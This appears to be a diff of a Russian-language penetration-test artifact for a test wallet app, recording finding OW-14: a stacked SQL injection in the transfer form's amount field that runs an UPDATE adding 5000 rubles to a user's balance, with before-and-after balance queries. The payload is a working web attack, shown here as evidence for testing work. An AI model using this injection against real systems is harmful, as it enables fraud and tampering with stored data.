@@ -9,13 +9,13 @@ OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
     · подряд, поэтому в форму перевода вставляется любая правка в базе: балансы,
     · роли, пароли, статусы. Ни одна проверка приложения между нами и базой не стоит.
     → SQL SELECT balance_kop FROM users WHERE login='ivanov';
-    ← psql 189441500
+    ← psql 194188900
     → POST /transfer/new  recipient=petrova amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--
     ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
     → SQL SELECT balance_kop FROM users WHERE login='ivanov';
-    ← psql 189941500
+    ← psql 194688900
     ┌─ АРТЕФАКТ · OW-14 · SQL-инъекция изменила баланс напрямую
-    │ users.login=ivanov  balance_kop: 189441500 → 189941500 (дельта +500000 коп)
+    │ users.login=ivanov  balance_kop: 194188900 → 194688900 (дельта +500000 коп)
     │ Запрос приложения не проверял и не вычислял эту прибавку.
     └─
 [+] баланс ivanov увеличен на 5000₽ через SQL-инъекцию
